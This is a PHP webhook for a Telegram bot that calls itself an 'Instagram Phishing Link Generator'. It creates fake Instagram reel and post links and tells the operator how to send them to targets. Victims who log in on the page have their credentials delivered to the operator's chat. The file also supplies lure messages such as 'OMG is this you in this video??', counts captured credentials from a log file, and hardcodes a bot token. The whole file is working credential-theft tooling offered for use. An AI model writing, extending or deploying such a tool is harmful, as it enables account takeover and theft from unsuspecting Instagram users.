<?php

// Load environment variables
if (file_exists(__DIR__ . '/.env')) {
    $lines = file(__DIR__ . '/.env', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        if (strpos(trim($line), '#') === 0) continue;
        if (strpos($line, '=') === false) continue;
        list($key, $value) = explode('=', $line, 2);
        $_ENV[trim($key)] = trim($value);
        putenv(trim($key) . '=' . trim($value));
    }
}

$telegram_bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: "8287031383:AAEUkQ0Yk9aiWGiG7_1d4SjIfAgR8msEWBA";
$telegram_chat_id = getenv('TELEGRAM_CHAT_ID') ?: "8244999766";
$base_url = getenv('BASE_URL') ?: "https://your-app.railway.app";

// Get incoming update from Telegram
$content = file_get_contents("php://input");
$update = json_decode($content, true);

if (!$update) {
    echo "No update received";
    exit;
}

// Extract message info
$message = $update['message'] ?? null;
if (!$message) {
    echo "No message";
    exit;
}

$chat_id = $message['chat']['id'];
$text = $message['text'] ?? '';
$user_name = $message['from']['first_name'] ?? 'User';

// Only respond to authorized user
if ($chat_id != $telegram_chat_id) {
    sendMessage($chat_id, "⛔ Unauthorized. This bot only works for authorized users.", $telegram_bot_token);
    exit;
}

// Handle commands
if ($text === '/start') {
    $welcome = "👋 Welcome to Instagram Phishing Link Generator!\n\n";
    $welcome .= "📌 *How to use:*\n";
    $welcome .= "1. Send me any Instagram video/reel/post URL\n";
    $welcome .= "2. I'll generate a phishing link for you\n";
    $welcome .= "3. Share that link with your target\n";
    $welcome .= "4. When they login, you'll receive their credentials here!\n\n";
    $welcome .= "📝 *Commands:*\n";
    $welcome .= "/start - Show this message\n";
    $welcome .= "/generate - Generate random phishing link\n";
    $welcome .= "/stats - View statistics\n";
    $welcome .= "/help - Show help\n\n";
    $welcome .= "🔗 *Just send me any URL to get started!*";
    
    sendMessage($chat_id, $welcome, $telegram_bot_token);
}
elseif ($text === '/help') {
    $help = "📖 *Help Guide*\n\n";
    $help .= "*To generate a phishing link:*\n";
    $help .= "Simply send me any URL (Instagram or any video link)\n\n";
    $help .= "*Example inputs:*\n";
    $help .= "• `https://instagram.com/reel/ABC123`\n";
    $help .= "• `https://youtube.com/watch?v=xyz`\n";
    $help .= "• `funny video`\n";
    $help .= "• Any text - I'll create a link!\n\n";
    $help .= "*What happens:*\n";
    $help .= "1. Victim clicks your link\n";
    $help .= "2. Sees Instagram login page\n";
    $help .= "3. Enters credentials\n";
    $help .= "4. You get their login info here! 🎯";
    
    sendMessage($chat_id, $help, $telegram_bot_token);
}
elseif ($text === '/generate') {
    $link = generatePhishingLink($base_url);
    $response = "🔗 *Your Phishing Link is Ready!*\n\n";
    $response .= "📎 *Link:*\n`{$link}`\n\n";
    $response .= "📋 *Click to copy, then share with target*\n\n";
    $response .= "💡 *Suggested messages:*\n";
    $response .= "• \"OMG is this you in this video?? 😱\"\n";
    $response .= "• \"Check out this funny reel! 😂\"\n";
    $response .= "• \"You have to see this post!\"\n";
    $response .= "• \"This is going viral! 🔥\"";
    
    sendMessage($chat_id, $response, $telegram_bot_token);
}
elseif ($text === '/stats') {
    $stats = getStats();
    $response = "📊 *Statistics*\n\n";
    $response .= "👥 Total Captures: {$stats['total']}\n";
    $response .= "📅 Today: {$stats['today']}\n";
    $response .= "🕐 Last capture: {$stats['last']}";
    
    sendMessage($chat_id, $response, $telegram_bot_token);
}
else {
    // Any other text - generate a phishing link
    $link = generatePhishingLink($base_url, $text);
    
    $response = "✅ *Phishing Link Generated!*\n\n";
    $response .= "🔗 *Your link:*\n`{$link}`\n\n";
    $response .= "📱 *Share this link with your target*\n\n";
    $response .= "When they click and enter credentials, you'll receive them here instantly! 🎯\n\n";
    $response .= "💬 *Suggested message to send:*\n";
    $response .= "\"_Hey! Is this you in this video?_ 😱\"\n\n";
    $response .= "⚡ Link is ready to use!";
    
    sendMessage($chat_id, $response, $telegram_bot_token);
}

// Functions

function generatePhishingLink($base_url, $input = null) {
    // Generate a random Instagram-like code
    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-';
    $code = '';
    for ($i = 0; $i < 11; $i++) {
        $code .= $chars[rand(0, strlen($chars) - 1)];
    }
    
    // Randomly choose link type
    $types = ['reel', 'p', 'tv'];
    $type = $types[array_rand($types)];
    
    return "{$base_url}/{$type}/{$code}";
}

function sendMessage($chat_id, $text, $token) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    
    $data = [
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => 'Markdown',
        'disable_web_page_preview' => true
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

function getStats() {
    $log_file = "credentials_log.txt";
    $stats = [
        'total' => 0,
        'today' => 0,
        'last' => 'Never'
    ];
    
    if (file_exists($log_file)) {
        $lines = file($log_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $stats['total'] = count($lines);
        
        $today = date('Y-m-d');
        foreach ($lines as $line) {
            if (strpos($line, $today) !== false) {
                $stats['today']++;
            }
        }
        
        if (count($lines) > 0) {
            $last_line = end($lines);
            preg_match('/\[(.*?)\]/', $last_line, $matches);
            $stats['last'] = $matches[1] ?? 'Unknown';
        }
    }
    
    return $stats;
}

?>
